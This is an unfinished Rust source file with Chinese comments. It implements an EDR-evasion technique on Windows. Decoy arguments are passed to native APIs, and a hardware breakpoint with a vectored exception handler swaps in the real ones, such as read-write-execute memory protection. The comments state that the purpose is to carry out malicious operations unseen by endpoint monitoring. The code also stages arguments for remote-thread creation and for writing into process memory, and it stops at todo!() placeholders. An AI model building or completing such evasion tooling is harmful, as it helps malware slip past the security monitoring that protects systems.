// 本mod核心是要调用 Windows API执行恶意操作（如申请可执行内存），但为了躲避EDR（端点检测与响应系统）的监控
// 明面上的调用：程序调用 API 时传入假参数（例如：申请 Read-Only)
// 真实的意图：真实的恶意参数（例如：申请 Read-Write-Execute内存）被打包封装在这个 WINAPI 枚举中，并存储在全局变量 CURRENT_API 里
// 偷梁换柱：当 CPU 执行到 API入口时触发硬件断点，异常处理程序（VEH）会捕获这个瞬间，从 CURRENT_API中取出真实的参数，写入寄存器，替换掉假的参数

// 1.在win64中,地址必须是8字节,64位的
// 2.在win64中,通用寄存器都是64位的

// use cfg_if;
use crate::types::{
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64, CONTEXT_DEBUG_REGISTERS_X86, HANDLE, OBJECT_ATTRIBUTES,EXCEPTION_POINTERS,EXCEPTION_SINGLE_STEP,EXCEPTION_CONTINUE_SEARCH
};

use crate::winapis::{NtGetContextThread,NtCurrentThread};

use core::{ffi::c_void, sync::atomic::AtomicBool};

pub static mut CURRENT_API: Option<WINAPI> = None;

/// 硬件断点的开关
static USE_BREAKPOINT: AtomicBool = AtomicBool::new(false);

/// 是否启用VEH的硬件断点,false会略veh,交给其他异常处理机制
#[inline(always)]
pub fn set_use_breakpoint(enable: bool) {
    USE_BREAKPOINT.store(enable, core::sync::atomic::Ordering::SeqCst);
}

/// 检查USE_BREAKPOINT这个硬件断点开关的状态
#[inline(always)]
pub fn is_breakpont_enable() -> bool {
    USE_BREAKPOINT.load(core::sync::atomic::Ordering::SeqCst)
}

/// Configures a hardware breakpoint on the specified address.
///
/// 取得当前线程中cpu调试寄存器(dr0-dr7)的状态(定义在CONTEXT_DEBUG_REGISTERS_AMD64中)
pub(crate) fn set_breakpoint<T: Into<u64>>(address: T) {
    let mut ctx = CONTEXT {
        ContextFlags: if cfg!(target_arch = "x86_64") {
            CONTEXT_DEBUG_REGISTERS_AMD64
        } else {
            CONTEXT_DEBUG_REGISTERS_X86
        },
        ..Default::default()
    };

    // retrieving current thread register(dr0-7)
    // 实现了隐藏导入表,但没有实现indirect syscall
    NtGetContextThread(NtCurrentThread(), &mut ctx);

    // 修改阶段
    // 需要引入[dependencies] 下添加 cfg_if
    // cfg_if::cfg_if!手动指定路径,不需要在本文件中use cfg
   cfg_if::cfg_if!{

    if #[cfg(target_arch="x86_64")]{

        // dr0(寄存器)
    }
   }
   
}


/// 
fn set_dr7_bits<T:Into<u64>>(curent:T,start_bit:i32,nmbr_bits:i32,new_bit:u64)->u64 {
    
    // 因为函数的参数类型是T:Into<u64>,那么可能传入u64\u32\usize等转为u64格式的类型,这里into()根据T的trait显示的进行转换
    // rust中不允许隐式的类型转换,只能使用as(强制转换)或From/Into trait 再使用into(),这种是类型安全的无损转换 
    let current=curent.into();

    // 构造需要的位宽 的掩码,此时低nmbr位全1,高63位都是0
    let mask = (1u64<<nmbr_bits)-1;

    // !(mask<<start_bit)将mask左移指定位,并取反.这样指定位从1变为0,其余位是1
    // 之后相与操作,结果是只有指定位仍然是0,其余位保留原值,
    // (new_bit<<start_bit),将新值对应的位左移,当start_bit大于0,后面的值变为0,高位也是0,只有需要修改的位的值保留下来
    // 和0或操作等于原值,这样就把新值填充到原值对应的位了
    // 当new_bit超出nmbr_bits就会出现错误
    (current&!(mask<<start_bit))|(new_bit<<start_bit)
}


#[derive(Debug)]
/// 暂存真实的API参数
/// 用于在异常处理期间恢复真实执行意图的参数包
///
/// 具体每个成员的含义在dinvk/源码分析中
pub enum WINAPI {
    /// represent the NtAllocateVirtualMemory call
    ///
    ///
    NtAllocateVirtualMemory { ProcessHandle: HANDLE, Protect: u32 },

    /// Represents the `NtCreateThreadEx` call.
    NtCreateThreadEx {
        ProcessHandle: HANDLE,
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    },

    /// Represents the `NtWriteVirtualMemory` call.
    NtWriteVirtualMemory {
        ProcessHandle: HANDLE,
        Buffer: *mut c_void,
        NumberOfBytesToWrite: *mut usize,
    },
}


#[cfg(target_arch="x86_64")]
#[allow(unsafe_op_in_unsafe_fn)]// 在unsafe函数体中进行unsafe操作
// extern "system"指示编译器使用windows标准

/// NTSTATUS是内核/Native的标准返回类型,代表一个操作的最终结果.
/// 返回i32为了匹配 Windows 回调函数预期的 LONG,类型返回值，用于控制异常分发流程（而非简单的成功/失败状态）
/// c:NTSTATUS 是 typedef LONG NTSTATUS,VEH 的返回值也是 LONG
/// rust中的i32与c的int/long(win64环境下)内存布局完全一致(4个字节)
/// 
/// extern "system"代表调用约定(calling convention),实质是规定在函数调用时,参数放寄存器还是压栈,谁清理栈空间?默认是extern rust
pub unsafe extern "system" fn veh_handler(exceptioninfo:*mut EXCEPTION_POINTERS)->i32 {
    
    // 处理非veh断点开启,或错误不是硬件断点的特定异常代码的情况,出现这种情况要将错误返回给系统继续处理
    if !is_breakpont_enable()||(*(*exceptioninfo).ExceptionRecord).ExceptionCode!=EXCEPTION_SINGLE_STEP{
        

        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context =(*exceptioninfo).ContextRecord ;

    // 确认异常发生时rip指向的是dr0的内容(通过set_brakpoint设置了dr0的地址为需要的api地址)
    // 确认dr7的第0位置位,以保证断点是因为dr0置位产生的
    if (*context).Rip==(*context).Dr0 &&
    ((*context).Dr7 &1)==1 {
        

        let Some(current) =  (*addr_of_mut!(CURRENT_API))
        .take(){
            match current {

                // NtAllocateVirtualMemory 原型：(Handle, Base, ZeroBits, Size, Type,Protect)。
                WINAPI::NtAllocateVirtualMemory { ProcessHandle, Protect }=>{

                    // R10的定义u64,匹配win64环境
                    // 通用寄存器是64位,所以R10是u64
                    // 在该原型函数对应的参数(ProcessHandle:Handle),实质是一个指针,在win64中,地址必须是8字节,64位的
                    // 此处R10存放的是NtAllocateVirtualMemory函数的第一个参数(syscall调用约定,就像ntdll 中的函数开头通常第一句就是 mov r10, rcx),不是标准x64调用(fastcall)约定
                    (*context).R10=ProcessHandle as u64;
                    // protect是第六个参数,也是最后一个参数
                    // 在执行到硬件断点触发的时刻,RSP指向返回地址
                    // 但winx64调用约定形成的栈布局:[RSP + 0x00]：返回地址 (Return Address),栈顶之上存放的是函数的参数
                    // 后面是四个8字节的影子空间(分别对应RCX,RDX,R8,R9),第5个参数在rsp+0x28,第六个参数在rsp+ox30
                    // 这里 *mut u32是因为,原型函数，NtAllocateVirtualMemory 的第 6 个参数 Protect的类型是ULONG(c中),是32位的.
                    // 虽然在win64中,寄存器都是64位,但栈上的参数并不总占8字节
                    *(((*context).Rsp+0x30) as *mut u32)=Protect;


                }
            }
            todo!()
        }
    }
    todo!()

}